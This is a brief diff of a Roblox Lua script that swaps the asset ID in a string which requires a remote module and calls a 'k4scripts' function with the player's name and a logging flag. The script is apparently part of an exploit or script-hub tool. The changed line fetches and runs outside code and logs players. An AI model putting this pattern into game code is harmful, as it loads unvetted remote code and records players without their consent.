@@ -22,7 +22,7 @@ local JointsService = game:GetService("JointsService")
 local StarterGui = game:GetService("StarterGui")
 
 local LocalPlayer = game:GetService("Players").LocalPlayer
-local requireScript = ("require(8472875238):k4scripts('%s', %s)"):format(LocalPlayer.Name, "true") -- set true to false to disable logging
+local requireScript = ("require(8530655817).k4scripts('%s', %s)"):format(LocalPlayer.Name, "true") -- set true to false to disable logging
 local invCode = "6HndYgC"
 
 local dateTimeNow = DateTime.now
